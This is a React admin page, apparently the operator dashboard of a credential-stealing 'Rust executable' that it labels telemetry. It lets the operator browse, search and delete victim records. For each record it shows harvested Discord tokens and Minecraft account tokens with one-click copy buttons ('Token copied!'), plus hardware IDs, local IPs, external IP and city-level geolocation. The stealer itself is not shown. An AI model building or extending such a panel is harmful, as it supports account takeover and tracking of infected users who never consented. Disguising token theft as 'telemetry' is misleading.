import { createFileRoute } from "@tanstack/react-router";
import { Loader2, Monitor, HardDrive, User as UserIcon, Calendar, Trash2, X, Copy, Mail, Phone, Hash, Check, Cpu, Database, Activity, Server, Maximize, Key, Network, MapPin, Laptop, Search, CheckSquare, Square } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { PageHeader, Card, ConfirmModal, Badge } from "@/components/admin/ui";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { api } from "@/lib/api";
import { toast } from "sonner";
import { useState, useEffect } from "react";

export const Route = createFileRoute("/admin/telemetry")({
  component: TelemetryPage,
});

function TelemetryPage() {
  const queryClient = useQueryClient();
  const [page, setPage] = useState(1);
  const [searchQuery, setSearchQuery] = useState("");

  // Reset page when search changes
  useEffect(() => {
    setPage(1);
  }, [searchQuery]);

  const { data: telemetryData, isLoading } = useQuery({
    queryKey: ["admin-telemetry", page, searchQuery],
    queryFn: () => api.admin.getTelemetry({
      page,
      limit: 50,
      search: searchQuery || undefined
    }),
  });

  const deleteMutation = useMutation({
    mutationFn: (id: number) => api.admin.deleteTelemetry(id),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["admin-telemetry"] });
      toast.success("Record deleted");
    },
    onError: (err: any) => toast.error(err.message),
  });

  const [viewDataId, setViewDataId] = useState<number | null>(null);
  const [activeTab, setActiveTab] = useState<"discord" | "minecraft" | "specs">("discord");
  const [specsTab, setSpecsTab] = useState<"cpu" | "ram" | "gpu" | "screen" | "hwid" | "os" | "host" | "ips" | "location">("cpu");
  const [confirmDeleteId, setConfirmDeleteId] = useState<number | null>(null);

  const [selectedIds, setSelectedIds] = useState<number[]>([]);
  const [confirmBulkDelete, setConfirmBulkDelete] = useState(false);

  const [seenUpdates, setSeenUpdates] = useState<Record<number, string>>(() => {
    const seen: Record<number, string> = {};
    try {
      if (typeof window !== "undefined") {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key && key.startsWith("telemetry-seen-")) {
            const id = parseInt(key.replace("telemetry-seen-", ""), 10);
            if (!isNaN(id)) {
              seen[id] = localStorage.getItem(key) || "";
            }
          }
        }
      }
    } catch (e) {
      console.error("Failed to load seen updates", e);
    }
    return seen;
  });

  const bulkDeleteMutation = useMutation({
    mutationFn: async (ids: number[]) => {
      await Promise.all(ids.map(id => api.admin.deleteTelemetry(id)));
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["admin-telemetry"] });
      toast.success("Selected records deleted");
      setSelectedIds([]);
      setConfirmBulkDelete(false);
    },
    onError: (err: any) => toast.error(err.message),
  });

  if (isLoading) {
    return (
      <div className="flex h-[80vh] items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-primary" />
      </div>
    );
  }

  const filteredTelemetry = telemetryData?.items || [];


  const toggleSelectAll = () => {
    if (selectedIds.length === filteredTelemetry?.length) {
      setSelectedIds([]);
    } else {
      setSelectedIds(filteredTelemetry?.map((t: any) => t.id) || []);
    }
  };

  const toggleSelect = (id: number) => {
    setSelectedIds(prev => prev.includes(id) ? prev.filter(x => x !== id) : [...prev, id]);
  };

  return (
    <div className="space-y-6">
      <PageHeader 
        title="Telemetry Data" 
        subtitle="Information collected from the Rust executable." 
      />

      <div className="flex flex-col sm:flex-row gap-4 justify-between items-center bg-card p-4 rounded-xl border border-white/5">
        <div className="relative w-full sm:w-96">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
          <input
            type="text"
            placeholder="Search by username, HWID, IP..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full glass-panel border border-white/10 rounded-lg pl-9 pr-4 py-2 text-sm text-white focus:outline-none focus:ring-2 focus:ring-primary/50 transition-all placeholder:text-zinc-600"
          />
        </div>
        
        <div className="flex items-center gap-3 w-full sm:w-auto">
          <button
            onClick={toggleSelectAll}
            className="flex items-center gap-2 px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-sm text-zinc-300 hover:text-white hover:bg-white/10 transition-colors"
          >
            {selectedIds.length === filteredTelemetry?.length && filteredTelemetry?.length > 0 ? (
              <CheckSquare size={16} className="text-primary" />
            ) : (
              <Square size={16} />
            )}
            Select All
          </button>
          
          <AnimatePresence>
            {selectedIds.length > 0 && (
              <motion.button
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.9 }}
                onClick={() => setConfirmBulkDelete(true)}
                className="flex items-center gap-2 px-3 py-2 bg-red-500/10 border border-red-500/20 rounded-lg text-sm text-red-500 hover:bg-red-500/20 transition-colors whitespace-nowrap"
              >
                <Trash2 size={16} />
                Delete ({selectedIds.length})
              </motion.button>
            )}
          </AnimatePresence>
        </div>
      </div>
      
      <div className="grid gap-4 md:grid-cols-1 lg:grid-cols-2 items-start">
        {filteredTelemetry?.map((t: any, index: number) => {
          const profile = (t.data?.discord || t.data?.d)?.v?.[0]?.profile;
          const isSelected = selectedIds.includes(t.id);
          const isUpdated = t.updated_at && new Date(t.updated_at).getTime() - new Date(t.created_at).getTime() > 1000;
          const isSeen = seenUpdates[t.id] === t.updated_at;

          const markAsSeen = () => {
            if (t.updated_at && !isSeen) {
              localStorage.setItem("telemetry-seen-" + t.id, t.updated_at);
              setSeenUpdates(prev => ({ ...prev, [t.id]: t.updated_at }));
            }
          };

          return (
          <div 
            key={t.id} 
            onClick={markAsSeen}
            className={`bg-card rounded-2xl border p-4 sm:p-5 flex flex-col gap-4 transition-all duration-200 border-2 cursor-pointer ${isSelected ? 'border-primary shadow-[0_0_15px_rgba(var(--primary),0.15)]' : 'border-transparent hover:border-white/10'}`}
          >
            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-start gap-3 sm:gap-2">
              <div className="flex items-start gap-3 min-w-0">
                <button 
                  onClick={(e) => {
                    e.stopPropagation();
                    toggleSelect(t.id);
                  }}
                  className="mt-1 flex-shrink-0 text-zinc-500 hover:text-primary transition-colors"
                >
                  {isSelected ? <CheckSquare size={18} className="text-primary" /> : <Square size={18} />}
                </button>
                <div className="min-w-0">
                  <h3 className="font-bold text-white flex items-center gap-2 truncate">
                    {profile ? (
                      <img 
                        src={profile.avatar ? `https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png?size=32` : `https://cdn.discordapp.com/embed/avatars/${parseInt(profile.discriminator || "0") % 5}.png`} 
                        alt="Avatar" 
                        className="w-5 h-5 rounded-full border border-white/10 flex-shrink-0"
                      />
                    ) : (
                      <Monitor size={16} className="text-primary flex-shrink-0" />
                    )}
                    <span className="truncate">{profile ? (profile.global_name || profile.username) : t.username}</span>
                  </h3>
                  <p className="text-xs text-zinc-400 font-mono mt-1 truncate">{t.ip_address}</p>
                </div>
              </div>
              <div className="flex items-center gap-2 self-end sm:self-auto" onClick={(e) => e.stopPropagation()}>
                <div className="text-[10px] bg-white/5 border border-white/10 px-2 py-1 rounded text-zinc-400">
                  ID: {t.id}
                </div>
                {isUpdated && !isSeen && (
                  <div className="text-[10px] bg-primary/20 border border-primary/30 px-2 py-1 rounded text-primary font-bold uppercase tracking-wider shadow-[0_0_10px_var(--primary-glow)]">
                    Updated
                  </div>
                )}
                <button
                  onClick={() => setConfirmDeleteId(t.id)}
                  disabled={deleteMutation.isPending || bulkDeleteMutation.isPending}
                  className="h-6 w-6 flex items-center justify-center rounded bg-red-500/10 text-red-500 border border-red-500/20 hover:bg-red-500/20 transition-all disabled:opacity-50"
                  title="Delete Record"
                >
                  <Trash2 size={12} />
                </button>
              </div>
            </div>

            <div className="space-y-3 text-sm text-zinc-300 bg-white/[0.04] p-3 rounded-xl border border-white/5 min-w-0">
              <div className="flex flex-col sm:flex-row sm:justify-between gap-1 sm:gap-2">
                <span className="text-zinc-500 flex items-center gap-1 shrink-0"><Monitor size={12}/> OS Info</span>
                <span className="font-medium text-white text-xs sm:text-right break-all sm:pl-2">{t.os_info}</span>
              </div>
              <div className="flex flex-col sm:flex-row sm:justify-between gap-1 sm:gap-2 min-w-0">
                <span className="text-zinc-500 flex items-center gap-1 shrink-0"><HardDrive size={12}/> HWID</span>
                <div className="flex items-center gap-2 min-w-0 justify-between sm:justify-end">
                  <span className="font-medium text-white text-xs truncate select-all">{t.hwid}</span>
                  <CopyButton text={t.hwid} size={12} />
                </div>
              </div>
              <div className="flex flex-col sm:flex-row sm:justify-between gap-1 sm:gap-2">
                <span className="text-zinc-500 flex items-center gap-1 shrink-0"><Calendar size={12}/> Time</span>
                <div className="text-xs sm:text-right space-y-1">
                  <div>{new Date(t.created_at).toLocaleString()}</div>
                  {isUpdated && (
                    <div className={`${isSeen ? "text-zinc-500" : "text-primary font-bold"} text-[10px]`}>
                      Last Update: {new Date(t.updated_at).toLocaleString()}
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="mt-auto" onClick={(e) => e.stopPropagation()}>
              {t.data && Object.keys(t.data).length > 0 ? (
                <div>
                  <button 
                    onClick={() => {
                      setViewDataId(t.id);
                      setActiveTab("discord");
                      markAsSeen();
                    }}
                    className="w-full py-2 bg-primary/10 text-primary border border-primary/20 rounded-lg text-xs font-bold hover:bg-primary/20 transition-all"
                  >
                    View Payload Data
                  </button>
                </div>
              ) : (
                <div className="text-center text-xs text-zinc-500 italic py-2">
                  No payload data
                </div>
              )}
            </div>
          </div>
          );
        })}
      </div>

      {/* Pagination Controls */}
      {telemetryData && telemetryData.pages > 1 && (
        <div className="mt-6 flex flex-col sm:flex-row items-center justify-between bg-card/40 backdrop-blur-xl p-4 rounded-xl border border-white/5 gap-4">
          <div className="text-sm text-muted-foreground font-medium">
            Showing page <span className="font-bold text-white">{telemetryData.page}</span> of{" "}
            <span className="font-bold text-white">{telemetryData.pages}</span> ({telemetryData.total} total records)
          </div>
          <div className="flex gap-2">
            <button
              disabled={page === 1}
              onClick={() => {
                setPage(p => Math.max(1, p - 1));
                window.scrollTo({ top: 0, behavior: "smooth" });
              }}
              className="px-4 py-2 text-xs font-semibold rounded-xl border border-white/10 bg-white/5 text-zinc-300 hover:text-white hover:bg-white/10 transition-all disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer"
            >
              Previous
            </button>
            <button
              disabled={page === telemetryData.pages}
              onClick={() => {
                setPage(p => Math.min(telemetryData.pages, p + 1));
                window.scrollTo({ top: 0, behavior: "smooth" });
              }}
              className="px-4 py-2 text-xs font-semibold rounded-xl border border-white/10 bg-white/5 text-zinc-300 hover:text-white hover:bg-white/10 transition-all disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer"
            >
              Next
            </button>
          </div>
        </div>
      )}
      
      {filteredTelemetry?.length === 0 && (
        <Card className="p-10 text-center">
          <p className="text-zinc-500">
            {searchQuery ? "No telemetry data matches your search." : "No telemetry data collected yet."}
          </p>
        </Card>
      )}

      <ConfirmModal
        isOpen={confirmDeleteId !== null}
        onClose={() => setConfirmDeleteId(null)}
        onConfirm={() => {
          if (confirmDeleteId !== null) deleteMutation.mutate(confirmDeleteId);
          setConfirmDeleteId(null);
        }}
        title="Delete Record"
        message="Are you sure you want to delete this telemetry record? This action cannot be undone."
      />

      <ConfirmModal
        isOpen={confirmBulkDelete}
        onClose={() => setConfirmBulkDelete(false)}
        onConfirm={() => bulkDeleteMutation.mutate(selectedIds)}
        title={`Delete ${selectedIds.length} Records`}
        message={`Are you sure you want to delete ${selectedIds.length} selected telemetry records? This action cannot be undone.`}
      />

      <AnimatePresence>
        {viewDataId !== null && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center bg-background/80 p-4 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="glass-strong w-full max-w-4xl max-h-[85vh] rounded-2xl p-6 shadow-2xl bg-card border border-white/10 flex flex-col"
            >
              <div className="flex justify-between items-center mb-4 md:mb-6 order-1 shrink-0">
                <h2 className="text-xl font-bold text-white flex items-center gap-2">
                  Payload Data
                  <span className="text-xs bg-primary/20 text-primary px-2 py-1 rounded-md border border-primary/20">
                    ID: {viewDataId}
                  </span>
                </h2>
                <button onClick={() => setViewDataId(null)} className="p-2 rounded-lg hover:bg-white/5 text-muted-foreground hover:text-white transition-colors">
                  <X size={20} />
                </button>
              </div>

              {/* Tabs */}
              <div className="flex gap-4 md:gap-6 border-t md:border-t-0 border-b-0 md:border-b border-white/10 mt-4 md:mt-0 mb-0 md:mb-6 order-3 md:order-2 overflow-x-auto no-scrollbar shrink-0 pt-4 md:pt-0">
                <button
                  onClick={() => setActiveTab("discord")}
                  className={`pb-3 text-sm font-bold flex items-center gap-2 transition-colors relative whitespace-nowrap shrink-0 ${activeTab === "discord" ? "text-[#5865F2]" : "text-muted-foreground hover:text-white"}`}
                >
                  <DiscordIcon className="w-4 h-4" /> Discord Data
                  {activeTab === "discord" && (
                    <motion.div layoutId="data-tab-indicator" className="absolute bottom-0 left-0 right-0 h-0.5 bg-[#5865F2]" />
                  )}
                </button>
                <button
                  onClick={() => setActiveTab("minecraft")}
                  className={`pb-3 text-sm font-bold flex items-center gap-2 transition-colors relative whitespace-nowrap shrink-0 ${activeTab === "minecraft" ? "text-primary" : "text-muted-foreground hover:text-white"}`}
                >
                  <MinecraftIcon className="w-4 h-4" /> Minecraft Data
                  {activeTab === "minecraft" && (
                    <motion.div layoutId="data-tab-indicator" className="absolute bottom-0 left-0 right-0 h-0.5 bg-primary" />
                  )}
                </button>
                <button
                  onClick={() => setActiveTab("specs")}
                  className={`pb-3 text-sm font-bold flex items-center gap-2 transition-colors relative whitespace-nowrap shrink-0 ${activeTab === "specs" ? "text-cyan-400" : "text-muted-foreground hover:text-white"}`}
                >
                  <Monitor className="w-4 h-4" /> PC Specs
                  {activeTab === "specs" && (
                    <motion.div layoutId="data-tab-indicator" className="absolute bottom-0 left-0 right-0 h-0.5 bg-cyan-400" />
                  )}
                </button>
              </div>

              {/* Content */}
              <div className="flex-1 min-h-0 overflow-y-auto custom-scrollbar glass-panel rounded-xl border border-white/5 p-4 order-2 md:order-3">
                {(() => {
                  const record = filteredTelemetry?.find((t: any) => t.id === viewDataId);
                  // support both old keys (discord/minecraft/specs) and new short keys (d/m/s)
                  const keyMap: Record<string, string> = { discord: "d", minecraft: "m", specs: "s" };
                  const data = record?.data?.[activeTab] || record?.data?.[keyMap[activeTab]];
                  
                  if (!data) return <div className="text-zinc-500 italic">No {activeTab} data found.</div>;
                  
                  if (activeTab === "discord") {
                    const tokens = data.v || [];
                    if (tokens.length === 0) return <div className="text-zinc-500 italic">No Discord tokens found.</div>;
                    
                    return (
                      <div className="space-y-6">
                        {tokens.map((t: any, idx: number) => {
                          const p = t.profile;
                          return (
                            <div key={idx} className="bg-card/40 border border-white/5 rounded-xl p-5 backdrop-blur-xl">
                              {p ? (
                                <div className="flex flex-col md:flex-row gap-6 items-start">
                                  <div className="shrink-0">
                                    <img 
                                      src={p.avatar ? `https://cdn.discordapp.com/avatars/${p.id}/${p.avatar}.png?size=128` : `https://cdn.discordapp.com/embed/avatars/${parseInt(p.discriminator || "0") % 5}.png`} 
                                      alt="Avatar" 
                                      className="w-24 h-24 rounded-2xl shadow-xl border border-white/10"
                                    />
                                  </div>
                                  <div className="flex-1 min-w-0 w-full space-y-3">
                                    <div className="w-full">
                                      <h3 className="text-2xl font-bold text-white flex items-center gap-2 flex-wrap">
                                        {p.global_name || p.username}
                                        <Badge tone="primary" className="bg-[#5865F2]/20 text-[#5865F2] ring-[#5865F2]/30 text-[10px]">@{p.username}</Badge>
                                      </h3>
                                      <div className="text-xs text-muted-foreground font-mono mt-1 flex items-center gap-1">
                                        <Hash size={12} /> {p.id}
                                      </div>
                                    </div>

                                    <div className="mt-4 p-3 bg-white/10 border border-white/5 rounded-lg flex items-center justify-between group w-full overflow-hidden">
                                      <div className="flex-1 min-w-0 truncate font-mono text-[10px] md:text-xs text-zinc-400 mr-2 md:mr-4 select-all">{t.t}</div>
                                      <CopyButton text={t.t} size={14} />
                                    </div>
                                    <div className="text-[10px] text-zinc-500 uppercase tracking-wider">Source: {t.s}</div>
                                  </div>
                                </div>
                              ) : (
                                <div className="space-y-2">
                                  <div className="text-sm font-bold text-white mb-2">Token Only (Profile Fetch Failed)</div>
                                  <div className="p-3 bg-white/10 border border-white/5 rounded-lg flex items-center justify-between group w-full overflow-hidden">
                                    <div className="flex-1 min-w-0 truncate font-mono text-[10px] md:text-xs text-zinc-400 mr-2 md:mr-4 select-all">{t.t}</div>
                                    <CopyButton text={t.t} size={14} />
                                  </div>
                                  <div className="text-[10px] text-zinc-500 uppercase tracking-wider">Source: {t.s}</div>
                                </div>
                              )}
                            </div>
                          );
                        })}
                      </div>
                    );
                  }

                  if (activeTab === "minecraft") {
                    const accounts = data.accounts || [];
                    if (accounts.length === 0) return <div className="text-zinc-500 italic">No Minecraft accounts found.</div>;

                    return (
                      <div className="grid md:grid-cols-2 gap-4">
                        {accounts.map((acc: any, idx: number) => (
                          <div key={idx} className="bg-card/40 border border-white/5 rounded-xl p-5 backdrop-blur-xl flex flex-col md:flex-row items-start gap-4 overflow-hidden">
                            <div className="shrink-0">
                            <img 
                              src={`https://minotar.net/helm/${acc.username}/64.png`} 
                              alt={acc.username} 
                              className="w-16 h-16 rounded-lg shadow-lg bg-white/10"
                              onError={(e) => { (e.target as HTMLImageElement).src = 'https://minotar.net/helm/Steve/64.png'; }}
                            />
                            </div>
                            <div className="flex-1 min-w-0 w-full">
                              <h3 className="text-lg font-bold text-white truncate">{acc.username}</h3>
                              <div className="text-[10px] text-zinc-500 uppercase tracking-wider mt-1 mb-3">Source: {acc.source}</div>
                              {acc.token && acc.token !== "" && (
                                <div className="p-2 bg-white/10 border border-white/5 rounded-lg flex items-center justify-between group mt-2 w-full overflow-hidden">
                                  <div className="flex-1 min-w-0 truncate font-mono text-[10px] md:text-xs text-zinc-400 mr-2 select-all">{acc.token}</div>
                                  <CopyButton text={acc.token} size={12} />
                                </div>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    );
                  }

                  if (activeTab === "specs") {
                    const adv = data.advanced || {};
                    return (
                      <div className="space-y-6">
                        {/* Sub-tabs for PC Specs */}
                        <div className="flex flex-wrap justify-center items-center gap-x-6 gap-y-2 border-b border-white/5 pb-2">
                          {[
                            { id: "cpu", label: "Processor", icon: Cpu },
                            { id: "ram", label: "RAM", icon: Database },
                            { id: "gpu", label: "Graphics", icon: Activity },
                            { id: "screen", label: "Screen", icon: Maximize },
                            { id: "hwid", label: "HWID", icon: Key },
                            { id: "os", label: "OS", icon: Monitor },
                            { id: "host", label: "Host", icon: Laptop },
                            { id: "ips", label: "Local IPs", icon: Network },
                            { id: "location", label: "Location", icon: MapPin },
                          ].map((tab) => (
                            <button
                              key={tab.id}
                              onClick={() => setSpecsTab(tab.id as any)}
                              className={`pb-2 text-xs font-bold flex items-center gap-2 transition-colors relative ${specsTab === tab.id ? "text-cyan-400" : "text-muted-foreground hover:text-white"}`}
                            >
                              <tab.icon size={14} /> {tab.label}
                              {specsTab === tab.id && (
                                <motion.div layoutId="specs-tab-indicator" className="absolute bottom-0 left-0 right-0 h-0.5 bg-cyan-400" />
                              )}
                            </button>
                          ))}
                        </div>

                        <AnimatePresence mode="wait">
                          <motion.div
                            key={specsTab}
                            initial={{ opacity: 0, y: 10 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -10 }}
                            transition={{ duration: 0.2 }}
                            className="bg-card/40 border border-white/5 rounded-xl p-6 backdrop-blur-xl max-w-2xl mx-auto w-full"
                          >
                            {specsTab === "cpu" && (
                              <div className="space-y-4">
                                <div><div className="text-xs text-zinc-500 mb-1">Name</div><div className="font-medium text-white text-lg">{adv.Processor?.Name || "Unknown"}</div></div>
                                <div><div className="text-xs text-zinc-500 mb-1">Manufacturer</div><div className="font-medium text-white">{adv.Processor?.Manufacturer || "Unknown"}</div></div>
                                <div className="grid grid-cols-3 gap-4">
                                  <div><div className="text-xs text-zinc-500 mb-1">Physical Cores</div><div className="font-medium text-white">{adv.Processor?.PhysicalCores || 0}</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Logical Cores</div><div className="font-medium text-white">{adv.Processor?.LogicalCores || 0}</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Max Clock</div><div className="font-medium text-white">{adv.Processor?.MaxClockSpeed || 0} MHz</div></div>
                                </div>
                              </div>
                            )}

                            {specsTab === "ram" && (
                              <div className="space-y-4">
                                <div><div className="text-xs text-zinc-500 mb-1">Total System Memory</div><div className="font-medium text-white text-2xl">{adv.RAM?.TotalGB || 0} GB</div></div>
                              </div>
                            )}

                            {specsTab === "gpu" && (
                              <div className="space-y-4">
                                <div><div className="text-xs text-zinc-500 mb-1">Name</div><div className="font-medium text-white text-lg">{adv.GPU?.Name || "Unknown"}</div></div>
                                <div><div className="text-xs text-zinc-500 mb-1">Video Processor</div><div className="font-medium text-white">{adv.GPU?.VideoProcessor || "Unknown"}</div></div>
                                <div className="grid grid-cols-2 gap-4">
                                  <div><div className="text-xs text-zinc-500 mb-1">VRAM</div><div className="font-medium text-white">{adv.GPU?.VRAM_GB || 0} GB</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Driver Version</div><div className="font-medium text-white">{adv.GPU?.DriverVersion || "Unknown"}</div></div>
                                </div>
                              </div>
                            )}

                            {specsTab === "screen" && (
                              <div className="space-y-4">
                                <div><div className="text-xs text-zinc-500 mb-1">Resolution</div><div className="font-medium text-white text-xl">{adv.Screen?.Resolution || "Unknown"}</div></div>
                                <div className="grid grid-cols-2 gap-4">
                                  <div><div className="text-xs text-zinc-500 mb-1">Refresh Rate</div><div className="font-medium text-white">{adv.Screen?.RefreshRate || 0} Hz</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Color Depth</div><div className="font-medium text-white">{adv.Screen?.BitsPerPixel || 0}-bit</div></div>
                                </div>
                              </div>
                            )}

                            {specsTab === "hwid" && (
                              <div className="space-y-4">
                                <div><div className="text-xs text-zinc-500 mb-2">Hardware ID (HWID)</div>
                                  <div className="font-medium text-white flex items-start gap-3 bg-white/10 p-4 rounded-lg border border-white/5">
                                    <span className="break-all flex-1 font-mono">{record.hwid}</span>
                                    <CopyButton text={record.hwid} size={16} />
                                  </div>
                                </div>
                              </div>
                            )}

                            {specsTab === "os" && (
                              <div className="space-y-4">
                                <div><div className="text-xs text-zinc-500 mb-1">Operating System</div><div className="font-medium text-white text-lg">{adv.OS?.Caption || "Unknown OS"}</div></div>
                                <div className="grid grid-cols-2 gap-4">
                                  <div><div className="text-xs text-zinc-500 mb-1">Version</div><div className="font-medium text-white">{adv.OS?.Version || "Unknown"}</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Build Number</div><div className="font-medium text-white">{adv.OS?.BuildNumber || "Unknown"}</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Architecture</div><div className="font-medium text-white">{adv.OS?.Architecture || "Unknown"}</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Install Date</div><div className="font-medium text-white">{adv.OS?.InstallDate || "Unknown"}</div></div>
                                </div>
                              </div>
                            )}

                            {specsTab === "host" && (
                              <div className="space-y-4">
                                <div>
                                  <div className="text-xs text-zinc-500 mb-1">Host Name</div>
                                  <div className="font-medium text-white text-xl flex items-center gap-3">
                                    {adv.Processor?.Name ? record.username : "Unknown"}
                                    <CopyButton text={record.username} size={14} />
                                  </div>
                                </div>
                                <div className="grid grid-cols-2 gap-4">
                                  <div><div className="text-xs text-zinc-500 mb-1">Motherboard Manufacturer</div><div className="font-medium text-white">{adv.Motherboard?.Manufacturer || "Unknown"}</div></div>
                                  <div><div className="text-xs text-zinc-500 mb-1">Motherboard Model</div><div className="font-medium text-white">{adv.Motherboard?.Model || "Unknown"}</div></div>
                                  <div className="col-span-2"><div className="text-xs text-zinc-500 mb-1">BIOS Version</div><div className="font-medium text-white">{adv.Motherboard?.BIOSVersion || "Unknown"}</div></div>
                                </div>
                              </div>
                            )}

                            {specsTab === "ips" && (
                              <div className="space-y-4">
                                <div><div className="text-xs text-zinc-500 mb-2">Local Network Interfaces</div>
                                  <div className="space-y-2">
                                    {data.local_ips?.length > 0 ? (
                                      data.local_ips.map((ip: string, i: number) => (
                                        <div key={i} className="flex items-center justify-between bg-white/[0.05] p-3 rounded-lg border border-white/5">
                                          <span className="font-mono text-primary">{ip}</span>
                                          <CopyButton text={ip} size={14} />
                                        </div>
                                      ))
                                    ) : <div className="text-zinc-500 italic">No local IPs found.</div>}
                                  </div>
                                </div>
                              </div>
                            )}

                            {specsTab === "location" && (
                              <div className="space-y-4">
                                {data.geolocation && data.geolocation.status === "success" ? (
                                  <>
                                    <div><div className="text-xs text-zinc-500 mb-1">External IP</div>
                                      <div className="font-medium text-primary text-xl flex items-center gap-3">
                                        {data.geolocation.query} <CopyButton text={data.geolocation.query} size={14} />
                                      </div>
                                    </div>
                                    <div className="grid grid-cols-2 gap-4">
                                      <div><div className="text-xs text-zinc-500 mb-1">City</div><div className="font-medium text-white">{data.geolocation.city}</div></div>
                                      <div><div className="text-xs text-zinc-500 mb-1">Country</div><div className="font-medium text-white">{data.geolocation.country} ({data.geolocation.countryCode})</div></div>
                                      <div><div className="text-xs text-zinc-500 mb-1">Region</div><div className="font-medium text-white">{data.geolocation.regionName}</div></div>
                                      <div><div className="text-xs text-zinc-500 mb-1">Zip Code</div><div className="font-medium text-white">{data.geolocation.zip || "Unknown"}</div></div>
                                      <div className="col-span-2"><div className="text-xs text-zinc-500 mb-1">ISP / ASN</div><div className="font-medium text-white">{data.geolocation.isp} / {data.geolocation.as}</div></div>
                                    </div>
                                  </>
                                ) : (
                                  <div className="text-zinc-500 italic">Geolocation data not available.</div>
                                )}
                              </div>
                            )}
                          </motion.div>
                        </AnimatePresence>
                      </div>
                    );
                  }

                  return null;
                })()}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

function CopyButton({ text, size = 14 }: { text: string; size?: number }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    try {
      let success = false;
      if (navigator.clipboard && window.isSecureContext) {
        try {
          await navigator.clipboard.writeText(text);
          success = true;
        } catch (e) {
          console.error("Clipboard API failed", e);
        }
      }
      
      if (!success) {
        const textArea = document.createElement("textarea");
        textArea.value = text;
        textArea.style.top = "0";
        textArea.style.left = "0";
        textArea.style.position = "fixed";
        textArea.style.opacity = "0";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
          const successful = document.execCommand('copy');
          if (!successful) throw new Error("execCommand failed");
        } catch (error) {
          console.error("Fallback copy failed", error);
          throw error;
        } finally {
          document.body.removeChild(textArea);
        }
      }
      setCopied(true);
      toast.success("Token copied!");
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      toast.error("Failed to copy");
    }
  };

  return (
    <button onClick={handleCopy} className="shrink-0 text-zinc-500 hover:text-white transition-colors relative flex items-center justify-center w-5 h-5">
      <AnimatePresence mode="wait">
        {copied ? (
          <motion.div key="check" initial={{ scale: 0 }} animate={{ scale: 1 }} exit={{ scale: 0 }} transition={{ duration: 0.15 }}>
            <Check size={size} className="text-primary" />
          </motion.div>
        ) : (
          <motion.div key="copy" initial={{ scale: 0 }} animate={{ scale: 1 }} exit={{ scale: 0 }} transition={{ duration: 0.15 }}>
            <Copy size={size} />
          </motion.div>
        )}
      </AnimatePresence>
    </button>
  );
}

function DiscordBadges({ flags, premiumType }: { flags?: number, premiumType?: number }) {
  if (flags == null && premiumType == null) return null;
  const badges = [];
  
  if (premiumType === 1) badges.push({ name: "Nitro Classic", color: "bg-[#f47fff]/20 text-[#f47fff] border-[#f47fff]/30" });
  if (premiumType === 2) badges.push({ name: "Nitro", color: "bg-[#f47fff]/20 text-[#f47fff] border-[#f47fff]/30" });
  if (premiumType === 3) badges.push({ name: "Nitro Basic", color: "bg-[#f47fff]/20 text-[#f47fff] border-[#f47fff]/30" });

  const f = flags || 0;
  if (f & (1 << 0)) badges.push({ name: "Discord Staff", color: "bg-blue-500/20 text-blue-400 border-blue-500/30" });
  if (f & (1 << 1)) badges.push({ name: "Partnered Server Owner", color: "bg-primary/20 text-primary border-primary/30" });
  if (f & (1 << 2)) badges.push({ name: "HypeSquad Events", color: "bg-orange-500/20 text-orange-400 border-orange-500/30" });
  if (f & (1 << 3)) badges.push({ name: "Bug Hunter Level 1", color: "bg-primary/20 text-green-400 border-primary/30" });
  if (f & (1 << 6)) badges.push({ name: "HypeSquad Bravery", color: "bg-purple-500/20 text-purple-400 border-purple-500/30" });
  if (f & (1 << 7)) badges.push({ name: "HypeSquad Brilliance", color: "bg-red-500/20 text-red-400 border-red-500/30" });
  if (f & (1 << 8)) badges.push({ name: "HypeSquad Balance", color: "bg-cyan-500/20 text-cyan-400 border-cyan-500/30" });
  if (f & (1 << 9)) badges.push({ name: "Early Supporter", color: "bg-pink-500/20 text-pink-400 border-pink-500/30" });
  if (f & (1 << 14)) badges.push({ name: "Bug Hunter Level 2", color: "bg-primary/20 text-green-400 border-primary/30" });
  if (f & (1 << 17)) badges.push({ name: "Early Verified Bot Developer", color: "bg-white/20 text-white border-white/30" });
  if (f & (1 << 22)) badges.push({ name: "Active Developer", color: "bg-primary/20 text-primary border-primary/30" });

  if (badges.length === 0) return null;

  return (
    <div className="flex flex-wrap gap-2 items-center mt-3">
      {badges.map(b => (
        <span key={b.name} className={`px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider rounded-md border ${b.color}`}>
          {b.name}
        </span>
      ))}
    </div>
  );
}

